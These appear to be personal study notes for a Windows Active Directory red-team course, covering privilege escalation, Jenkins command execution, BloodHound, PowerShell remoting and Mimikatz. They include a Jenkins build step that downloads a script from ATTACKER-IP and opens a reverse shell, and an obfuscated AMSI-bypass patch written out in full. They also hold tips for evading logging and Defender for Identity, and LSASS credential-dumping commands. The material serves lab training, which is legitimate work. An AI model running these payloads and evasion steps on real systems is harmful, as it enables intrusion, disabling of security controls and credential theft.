---
~
---
# **Local Privilege Escalation**

There are various ways of locally escalating privileges on windows box -:
- Missing patches
- Automated deployment and Auto Logon passwords in clear text
- AlwaysInstallElevated (Any user can run MSI as SYSTEM)
- Misconfigured Services
- DLL Hijacking and more
- NTLM Relaying a.k.a won't fix


We can use below tools for complete coverage


- PowerUp - https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
- PrivEsc - https://github.com/enjoiz/Privesc
- WinPEAS - https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/

Service Issues using `PowerUp`

- Get services with unquoted paths and a space in their name


```powershell
$ Get-ServiceUnqouted -Verbose
```



- Get services where the current user can write to its binary or change arguments to the binary

```powershell
$ Get-ModifiableServiceFile -Verbose
```



- Get the services whose configuration current user can modify

```powershell
$ Get-ModifiableService -Verbose
```



We can also automate this by using the below commands


```powershell
# For Powerup
$ Invoke-AllChecks

# For PrivEsc
$ Invoke-PrivEsc

# For PEASS-ng
$ winPEASx64.exe
```


**Feature Abuse**

• What we have been doing up to now (and will keep doing further in the
class) is relying on features abuse.
• Features abuse are awesome as there are seldom patches for them and
they are not the focus of security teams!
• One of my favorite features abuse is targeting enterprise applications
which are not built keeping security in mind.
• On Windows, many enterprise applications need either Administrative
privileges or SYSTEM privileges making them a great avenue for privilege
escalation.

**Example - Jenkins -:**


• Let’s use an older version of Jenkins as an example of vulnerable
Enterprise application.
• Jenkins is a widely used Continuous Integration tool.
• There are many interesting aspects with Jenkins but for now we would
limit our discussion to the ability of running system commands on
Jenkins.
• There is a Jenkins server running on dcorp-ci (172.16.3.11) on port
8080.

**Exploit -:**

- If we have admin access (default installation before 2.x)
- Navigate to `http://<jenkins_server/script`
- Now paste in below groovy script, Make sure to replace [INSERT COMMAND] with your own command

```
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = '[INSERT COMMAND]'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```



- If you don't have admin access but could add or edit build steps in the build configuration. 
- Add a build step, Navigate to `/job/Project0/configure` (If you get a `403` keep changing Project0 to Project1, Pro...2, ..........3 till you get a `200`)
- Scroll down to the option "**Build steps**" and on the drop down select/add "**Execute Windows Batch Command**" and enter-:

```
powershell iex (iwr -UseBasicParsing http://ATTACKER-IP/Invoke-PowerShellTcp.ps1);power -Reverse -IPAddress ATTACKER-IP -Port 443
```

- Now we can go ahead and start up a listener with netcat using the `netcat.exe` version to listen on the specified port

```bat
$ C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443
```

- Also we need to host our `Invoke-PowerShellTcp.ps1` script as stated in the payload, we can use a tool called **HTTP File Server (HFS)** or just try to google what works for you (Drag and drop the `Invoke-PowerShellTcp.ps1` to the left pane )


![](https://i.imgur.com/0MnoHoT.png)

- We also need to turn off windows firewall for this to work, so do that also


![](https://i.imgur.com/ksH2Ukn.png)



 
- Again, you could download and execute scripts, run encoded scripts and more.


> **General Note :** Many users use their username as password so make sure to try something like `manager:manager`



# **Learning Objective 5**


- Exploit a service on dcorp-studentx and elevate privileges to local administrator.
- Identify a machine in the domain where studentx has local administrative access. 
- Using privileges of a user on Jenkins on 172.16.3.11:8080, get admin privileges on 172.16.3.11 - the dcorp-ci server


## **Solution**


**_Coming Soon_**

> **Note :** Renaming a local admin account might be recommended but renaming a domain admin account is not recommended, THEY can still detect you are Admin, by your **SID** 🙂.



# **Domain Enumeration Cont'd - BloodHound**


- Commonly used by penetration testers and Red teamers.
- Provides GUI for AD entities and relationships for the data collected by its ingestors.
- Uses graph Theory for providing the capability of mapping shortest path for interesting things like Domain Admins.
- Bloodhound creates alot of detection if used carelessly
- Supports custom Cipher queries.

https://github.com/BloodHoundAD/BloodHound


## **Usage**

- To bypass .NET AMSI just paste in below code on `powershell`

```powershell
$ZQCUW = @"
using System;
using System.Runtime.InteropServices;
public class ZQCUW {
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string
procName);
[DllImport("kernel32")]
public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr
dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $ZQCUW
$BBWHVWQ =
[ZQCUW]::LoadLibrary("$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&#97;&#109;&#115
;&#105;&#46;&#100;&#108;&#108;'))")
$XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ,
"$([systeM.neT.webUtility]::HtMldECoDE('&#65;&#109;&#115;&#105;&#83;&#99;&#97
;&#110;&#66;&#117;&#102;&#102;&#101;&#114;'))")
$p = 0
[ZQCUW]::VirtualProtect($XPYMWR, [uint32]5, 0x40, [ref]$p)
$TLML = "0xB8"
$PURX = "0x57"
$YNWL = "0x00"
$RTGX = "0x07"
$XVON = "0x80"
$WRUD = "0xC3"
$KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)
[System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)
```

- Supply data to BloodHound (Remember to bypass .NET AMSI first 🙄)

```powershell
$ ..\SharpHound.ps1
```

- Start BloodHound collector, to gather data

```powershell
$ Invoke-BloodHound -CollectionMethod All

# OR

$ SharpHound.exe
```


- Start up the bloodhound GUI also make sure to start up **neo4j** (refer to lab manual 📚 for more info)

- The generated archive can be uploaded to the BloodHound Application (usually located under `.\BloodHound-master\collectors` directory and it a zip-file(no need to unzip), you can also just do **drag and drop**)


- To make BloodHound collection stealthy, use `-stealth` option. (Removes noisy collection methods like RDP, DCOM, PSRemote and LocalAdmin).

```powershell
$ Invoke-BloodHound -Stealth

# OR

$ SharpHound.exe --stealth
```

- To avoid detections like MDI

```powershell
$ Invoke-BloodHound -ExcludeDCs
```

> **Note :** we are not going to shy away from/[ignore] **Microsoft Defender for Identity** (MDI), we might not be worried about **Microsoft Detection Endpoint** (MDE) because they are specific to active directory attacks, we would evade MDI as much as possible.


# **Learning Objective 6**

- Setup BloodHound and identify shortest path to Domain Admins in the dollarcorp domain.

## **Solution**


**_Coming Soon_**


**In other to download a guide to follow, you can use this [book](https://ernw.de/download/BloodHoundWorkshop/ERNW_DogWhispererHandbook.pdf) :** 

> **Note :** For the CRTP exam do not try to setup bloodhound on foothold as it will lead to waste of **time**, setup a bloodhound **GUI** and keep it ready on your Host system so you can transfer to foothold machine.
> Also the older version of BloodHound might just be the best to use because it gives you the privileges to enumerate local admin rights, so try and use that one too.


# **Lateral Movement - PowerShell Remoting**

- Think of **powershell remoting** (PSRemoting) as psexec on steroids but much more silent and super fast!
- PSRemoting uses Windows Remoting Management (WinRM) which is Microsoft's implementation of WS-Management.
- Enabled by default on Server 2012 onwards with a firewall exception.
- Uses WinRM and listens by default on 5985 (HTTP) and 5986 (HTTPS)
- It is the recommended way to manage windows Cores servers.
- You may need to enable remoting (Enable-PSRemoting) on a Desktop Windows machine, Admin privileges are required to do that. 
- The remoting process runs as a high integrity process. That is, you get an elevated shell.


## **There are two ways of remoting to a machine**

- [ ]  **One-to-One**
	- PSSession
		- Interactive
		- Runs in a new process (wsmprovhost)
		- Is Stateful


> **Note :** When you PSRemote to a machine  it is not a powershell process that runs on the machine, it is a process called the **wsmprovhost**  that spins up on the target machine


- Useful cmdlets

```powershell
$ New-PSSession
$ Enter-PSSession
```


**_Example_**

As shown below we have administrative access on the current `dcorp-adminsrv` machine, this is how we can access the machine where we have administrative access using **Power Shell Remoting** 


![](https://i.imgur.com/ERPf5mM.png)




- Then run

```powershell
$ exit
$ $adminsrv = NewPSSession dcorp-adminsrv
$ $adminsrv
```


**_Example_**


![](https://i.imgur.com/72tbr19.png)


> **Pros and Cons :** If we have permissions to move laterally from our machine to like 10,000 machines the **One-to-one** might not work, because we have to do it manually but with the **One-to-Many**, we can actually move easily

- [ ] **One-to-Many**
	- Also known as Fan-out remoting.
	- Non-interactive
	- Executes commands parallely
	- Useful cmdlets

```powershell
$ Invoke-Command
```


- Run commands and scripts on
	- multiple remote computers,
	- in disconnected sessions (v3)
	- as background job and more.
- The best thing in powershell for passing the hashes, using credentials and executing commands on multiple remote computers.
- Use `-Credential` parameter to pass **username/password**.



- Use below to execute commands or scriptblocks (This will execute the `Get-Process` command on each machine):

```powershell
$ Invoke-Command -Scriptblock {Get-Process} -ComputerName (Get-Content <list_of_servers>)
```



- Use below to execute scripts from files

```powershell
$ Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)
```


- Use below to execute locally loaded function on the remote machines:


```powershell
$ Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>)
```

- In this case, we are passing Arguments. Keep in mind that only positional arguments could be passed this way:

```powershell
$ Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>) -ArgumentList
```


**_Example Usage_** -:


Run the `whoami` and `hostname` command on the `$adminsrv` server


![](https://i.imgur.com/SniQryf.png)


- Use below to execute "Stateful" commands using Invoke-Command:

```powershell
$ $Sess = New-PSSession -Computername Server1 Invoke-Command -Session $Sess -ScriptBlock {$Proc = Get-Process} Invoke-Command -Session $Sess -ScriptBlock {$Proc.Name}
```



## **PowerShell Remoting - Tradecraft**


- PowerShell remoting supports the system-wide transcripts and deep script block logging.
- We can use winrs in place of PSRemoting to evade the logging (and still reap the benefit of 5985 allowed between hosts):

```powershell
winrs -remote:server1 -u:server1\administrator -
p:Pass@1234 hostname
```

- We can also use winrm.vbs and COM objects of WSMan object - https://github.com/bohops/WSMan-WinRM



# **Lateral Movement - Invoke-Mimikatz**


- Mimikatz can be used to dump credentials, tickets, and many more interesting attacks!
- Invoke-Mimikatz, is a PowerShell port of Mimikatz. Using the code from `ReflectivePEInjection`, mimikatz is loaded reflectively into the memory. All the functions of mimikatz could be used from this script.
- The script needs administrative privileges for dumping credentials from local machine. Many attacks need specific privileges which are covered while discussing that attack.



## **Lateral Movement - Extracting Credentials from LSASS**


- Dump credentials on a local machine using Mimikatz

```powershell
$ Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
```


- Using SafetyKatz (Minidump of lsass and PELoader to run Mimikatz)

```powershell
$ SafetyKatz.exe "sekurlsa::ekeys"
```


- Dump credentials Using SharpKatz (C# port of some of Mimikatz functionality).

```powershell
$ SharpKatz.exe --Command ekeys
```



- Dump credentials using Dumpert (Direct System Calls and API unhooking)


```powershell
$ rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump
```


> **Note :** Anything that interact with LSASS has higher chances of detection, so before trying to extract credentials from LSASS we can try to lookup other revenues e.g powershell console history, Local SAM hives, Credential Notes etc.


